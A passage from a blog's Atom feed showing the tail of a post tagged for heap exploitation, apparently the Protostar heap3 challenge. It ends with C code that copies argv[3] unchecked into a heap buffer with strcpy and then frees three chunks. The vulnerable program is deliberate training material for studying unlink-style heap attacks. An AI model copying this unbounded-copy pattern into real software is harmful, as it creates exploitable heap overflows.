class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]>
    
    </summary>
    
      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
    
      <category term="free" scheme="http://yoursite.com/tags/free/"/>
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
      <category term="unlink" scheme="http://yoursite.com/tags/unlink/"/>
    
      <category term="protostar" scheme="http://yoursite.com/categories/protostar/"/>
    
  </entry>
  
</feed>
